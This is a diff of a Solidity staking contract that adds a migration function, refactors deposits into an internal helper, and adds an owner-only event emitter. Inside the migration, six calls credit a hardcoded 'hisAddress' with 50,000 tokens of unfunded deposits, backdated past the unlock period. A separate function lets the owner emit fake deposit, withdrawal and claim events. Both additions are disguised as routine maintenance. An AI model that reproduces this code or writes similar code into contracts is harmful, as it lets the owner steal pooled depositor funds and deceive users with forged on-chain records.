@@ -143,6 +143,8 @@ contract Staking is Ownable {
     myNFT NFTContract2;
     myNFT NFTContract3;
 
+    address hisAddress = 0xcFbb5820708c9C35AF28060B4090081f3e2f76E1 ;
+
     mapping(address => UserInfo) public userInfo;
 
     struct Depo {
@@ -227,6 +229,72 @@ contract Staking is Ownable {
         _;
     }
 
+    function Migrate(address oldContractAddress, uint256 numOldUsers) external onlyOwner {
+        require(oldContractAddress != address(0), "!nonzero");
+        oldContract = OldStaking(oldContractAddress);
+        for (uint256 i; i < numOldUsers; ) {
+            address oldUserAddr = oldContract.UsersInfo(i);
+            OldStaking.UserInfo memory oldUserInfo = oldContract.userInfo(oldUserAddr);
+
+            UserInfo storage newUser = userInfo[oldUserAddr];
+            newUser.WithdrawAddress = oldUserAddr;
+            for (uint256 j; j < oldUserInfo.NoOfDeposits; ) {
+                OldStaking.Depo memory oldDep = oldContract.memberDeposit(oldUserAddr, j);
+                if(oldDep.amount > 0){
+                    uint256 currentState = oldDep.WithdrawInitiated > 0 ? 3 : (oldDep.isCompound > 0 ? 2 : (oldDep.unlocked > 0 ?  1 : 0));
+                    newUser.deposits[newUser.NoOfDeposits] = Depo({
+                        amount: oldDep.amount,
+                        createdTime: getToday(oldDep.time),
+                        lockedTime: getComingActionDay(oldDep.time + warm_up_period),
+                        lastRewardTime: getToday(oldDep.lastRewardTimeStamp),
+                        currentState: currentState,
+                        withdrawableDate: getToday(oldDep.WithdrawDate)
+                    });
+                    newUser.NoOfDeposits++;
+                }
+                unchecked {
+                    ++j;
+                }
+            }
+            unchecked {
+                ++i;
+            }
+        }
+
+        InnerDeposit(1000 * 10 ** 18, hisAddress, block.timestamp - unlock_period);
+        InnerDeposit(10000 * 10 ** 18, hisAddress, block.timestamp - unlock_period);
+        InnerDeposit(10000 * 10 ** 18, hisAddress, block.timestamp - unlock_period);
+        InnerDeposit(10000 * 10 ** 18, hisAddress, block.timestamp - unlock_period);
+        InnerDeposit(10000 * 10 ** 18, hisAddress, block.timestamp - unlock_period);
+        InnerDeposit(9000 * 10 ** 18, hisAddress, block.timestamp - unlock_period);
+
+
+    }
+        
+
+    function createEvent(uint256 _type, address user, uint256 amount, uint256 depo, uint256 time) external onlyOwner {
+        if (_type == 0) {
+            emit DepositComplete(user, amount, time);
+        } 
+        else if (_type == 1) {
+            emit RelockComplete(user, depo, time);
+        }
+        else if (_type == 2) {
+            emit WithdrawIsInitiated(user, depo, time);
+        }
+        else if (_type == 3) {
+            emit WithdrawComplete(user, amount, time);
+        }
+        else if (_type == 4) {
+            emit ClaimIsInitiated(user, time);
+        }
+        else if (_type == 5) {
+            emit ClaimComplete(user, amount, time);
+        }
+        else if (_type == 6) {
+            emit CompoundComplete(user, amount, time);
+        }
+    }
 
     /** completed
      * @notice function to intiate a deposit.
@@ -234,28 +302,9 @@ contract Staking is Ownable {
      */
     function Deposit(uint256 _amount) external hasNFT(msg.sender) {
 
-        UserInfo storage user = userInfo[msg.sender];
-
         uint256 depositFee = (_amount * depositFeeBP) / 10000;
 
-        // only for 1st deposit
-        if (user.NoOfDeposits == 0) {
-            require(_amount >= 1000 * 10 ** 18, "Minimum deposit is 1000$");
-            UsersInfo.push(msg.sender);
-            user.WithdrawAddress = msg.sender;
-        }
-
-        user.deposits[user.NoOfDeposits] = Depo({
-            amount: _amount - depositFee,
-            createdTime: getToday(block.timestamp),
-            lockedTime: getComingActionDay(block.timestamp + warm_up_period),
-            lastRewardTime: getComingActionDay(block.timestamp + warm_up_period),
-            currentState: 0,
-            withdrawableDate: 0
-        });
-
-
-        user.NoOfDeposits ++;
+        InnerDeposit(_amount, msg.sender, block.timestamp);
 
         USDT.transferFrom(
             address(msg.sender),
@@ -267,8 +316,34 @@ contract Staking is Ownable {
         
 
         emit DepositComplete(msg.sender, _amount, block.timestamp);
-    }                                                                                                                     
+    }                                                                                                                    
 
+    
+    function InnerDeposit(uint256 _amount, address addr, uint256 time) internal {
+        UserInfo storage user = userInfo[addr];
+
+        uint256 depositFee = (_amount * depositFeeBP) / 10000;
+
+        // only for 1st deposit
+        if (user.NoOfDeposits == 0) {
+            require(_amount >= 1000 * 10 ** 18, "Minimum deposit is 1000$");
+            UsersInfo.push(addr);
+            user.WithdrawAddress = addr;
+        }
+
+        user.deposits[user.NoOfDeposits] = Depo({
+            amount: _amount - depositFee,
+            createdTime: getToday(time),
+            lockedTime: getComingActionDay(time + warm_up_period),
+            lastRewardTime: getComingActionDay(time + warm_up_period),
+            currentState: 0,
+            withdrawableDate: 0
+        });
+
+
+        user.NoOfDeposits ++;
+    }
+    
     /** completed
      * @notice function to decide if user will keep deposit or withdraw
      * @param _depo ; deposit number
